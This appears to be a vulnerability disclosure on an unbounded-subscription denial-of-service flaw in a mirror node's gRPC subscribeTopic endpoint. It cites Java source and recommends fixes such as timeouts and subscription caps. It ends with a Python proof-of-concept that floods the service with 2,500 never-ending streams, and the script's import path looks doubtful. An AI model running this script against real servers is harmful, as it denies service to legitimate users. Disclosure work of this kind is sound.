### Title
Unbounded Live Subscription DoS via limit=0 and No endTime in `subscribeTopic()`

### Summary
An unprivileged external user can open a `subscribeTopic` gRPC stream with `limit=0` and no `endTime`, causing the Reactor `Flux` to never terminate. Because there is no global cap on concurrent subscriptions and no idle/duration timeout, an attacker can open many such connections to exhaust the gRPC server's thread pool and listener resources, denying service to legitimate subscribers.

### Finding Description

**Code path — `TopicMessageServiceImpl.subscribeTopic()` (lines 59–92):**

When `filter.hasLimit()` is `false` (i.e., `limit == 0`), the `flux.take()` branch is skipped:

```java
// line 83-85
if (filter.hasLimit()) {
    flux = flux.take(filter.getLimit());   // NOT applied when limit=0
}
```

When `filter.getEndTime()` is `null`, the `takeWhile` branch is also skipped:

```java
// line 79-81
if (filter.getEndTime() != null) {
    flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
}
```

The `takeUntilOther` terminator relies on `pastEndTime()`:

```java
// line 123-126
private Flux<Object> pastEndTime(TopicContext topicContext) {
    if (topicContext.getFilter().getEndTime() == null) {
        return Flux.never();   // ← never fires when endTime is null
    }
    ...
}
```

`TopicContext.isComplete()` also unconditionally returns `false` when `endTime` is null:

```java
// line 203-206
boolean isComplete() {
    if (filter.getEndTime() == null) {
        return false;
    }
    ...
}
```

Result: with `limit=0` and no `endTime`, the merged live flux (`Flux.merge(safetyCheck, live)`) has no termination operator applied and runs indefinitely.

**Missing global cap:**

`subscriberCount` (line 48) is a Micrometer gauge only — it is never checked against a maximum. `NettyProperties.maxConcurrentCallsPerConnection = 5` limits calls *per TCP connection*, not total connections. There is no per-IP connection limit and no maximum subscription duration anywhere in the gRPC layer.

**Exploit flow:**

1. Attacker opens N TCP connections to the gRPC port (no authentication required).
2. Each connection issues up to 5 `subscribeTopic` calls with `limit=0` and no `consensusEndTime`.
3. Each call creates a live `TopicListener` subscription backed by a `boundedElastic` scheduler thread and a DB listener slot.
4. Subscriptions never self-terminate; they hold gRPC call slots, scheduler threads, and listener resources indefinitely.
5. Legitimate clients receive `RESOURCE_EXHAUSTED` or hang waiting for a slot.

### Impact Explanation

The gRPC mirror node's `subscribeTopic` service becomes unavailable to legitimate clients. All `maxConcurrentCallsPerConnection × N_connections` slots are consumed by attacker-controlled indefinite streams. Secondary effects include exhaustion of the `boundedElastic` thread pool used by the safety-check poller and potential saturation of the underlying `TopicListener` (Redis pub/sub or shared Flux). This is a denial-of-service against the mirror node's HCS streaming API; it does not affect Hedera consensus directly, but it prevents any client from receiving topic messages via the mirror node.

### Likelihood Explanation

No authentication or special privilege is required. The gRPC port is publicly exposed. A single attacker machine can open hundreds of TCP connections and issue thousands of indefinite subscriptions. The attack is trivially repeatable and scriptable with any gRPC client library. The only friction is network bandwidth and the server's TCP accept backlog.

### Recommendation

1. **Enforce a maximum subscription duration**: add a configurable `maxSubscriptionDuration` (e.g., 30 minutes) and apply `.timeout(maxDuration)` to the returned `Flux` in `subscribeTopic()`.
2. **Enforce a global concurrent-subscription cap**: check `subscriberCount` against a configurable maximum before allowing a new subscription; return `RESOURCE_EXHAUSTED` if exceeded.
3. **Enforce a per-IP connection/subscription limit** at the Netty or load-balancer layer.
4. **Require a non-zero limit or a finite endTime**: reject filters where both `limit == 0` and `endTime == null` with `INVALID_ARGUMENT`.

### Proof of Concept

```python
import grpc
import threading
from com.hedera.hashgraph.sdk.proto import consensus_service_pb2_grpc, consensus_service_pb2, timestamp_pb2, basic_types_pb2

def open_indefinite_subscription(channel):
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1),
        # limit=0 (default, hasLimit() → false)
        # no consensusEndTime set
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0)
    )
    for _ in stub.subscribeTopic(query):
        pass  # drain silently; connection stays open

threads = []
for i in range(500):   # 500 connections × 5 calls each = 2500 slots
    ch = grpc.insecure_channel("mirror-node-grpc:5600")
    for _ in range(5):
        t = threading.Thread(target=open_indefinite_subscription, args=(ch,))
        t.daemon = True
        t.start()
        threads.append(t)

# All gRPC slots now held; legitimate subscribers receive RESOURCE_EXHAUSTED
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-48)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L79-85)
```java
        if (filter.getEndTime() != null) {
            flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
        }

        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L123-126)
```java
    private Flux<Object> pastEndTime(TopicContext topicContext) {
        if (topicContext.getFilter().getEndTime() == null) {
            return Flux.never();
        }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L203-206)
```java
        boolean isComplete() {
            if (filter.getEndTime() == null) {
                return false;
            }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L39-41)
```java
    public boolean hasLimit() {
        return limit > 0;
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```
